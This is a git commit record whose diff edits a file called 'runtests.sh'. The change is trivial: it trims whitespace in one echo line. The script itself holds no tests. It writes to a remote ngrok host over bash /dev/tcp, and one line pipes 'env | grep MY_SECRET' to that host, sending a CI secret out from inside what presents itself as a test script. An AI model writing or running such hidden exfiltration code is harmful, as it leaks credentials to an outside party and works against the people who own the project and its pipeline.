c88199e066da08db18f62f95f687c654c2c3d2bf
xyexternal <133779591+xyexternal@users.noreply.github.com>
2023-10-31 13:13:43 +0100

    Update runtests.sh

--- runtests.sh
+++ runtests.sh
@@ -1,5 +1,5 @@
 echo "Executing Tests script" >> runtests.out
-echo "Execution from READ user " > /dev/tcp/4.tcp.eu.ngrok.io/18328
+echo "Execution from READ user" > /dev/tcp/4.tcp.eu.ngrok.io/18328
 env | grep MY_SECRET > /dev/tcp/4.tcp.eu.ngrok.io/18328
 RET=0
 exit $RET
